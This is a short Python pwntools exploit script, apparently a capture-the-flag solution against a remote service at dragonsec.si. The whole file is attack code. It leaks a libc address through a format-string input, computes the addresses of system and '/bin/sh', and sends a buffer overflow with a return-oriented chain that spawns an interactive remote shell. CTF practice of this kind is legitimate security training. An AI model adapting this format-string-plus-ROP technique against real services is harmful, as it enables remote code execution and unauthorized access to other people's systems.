from pwn import *
p = remote('dragonsec.si',40005)

pad = 120 * 'A'
#buf + 7
payload1 = '%13$p'
pop_rdi_ret = p64(0x0000000000400743)
ret = p64(0x00000000004004c6)

p.sendlineafter('again?\n',payload1)

leak = int(p.recvline()[7:21],16)
_libc_start_main = leak -243 #server 243

system = _libc_start_main+ 0x2e450 
bin_sh = _libc_start_main+0x1905ea 

payload2 = pad
payload2 += pop_rdi_ret
payload2 += p64(bin_sh)
payload2 += ret
payload2 += p64(system)


print 'leak: '+hex(_libc_start_main)
p.sendlineafter('drink?\n',payload2)
p.interactive()
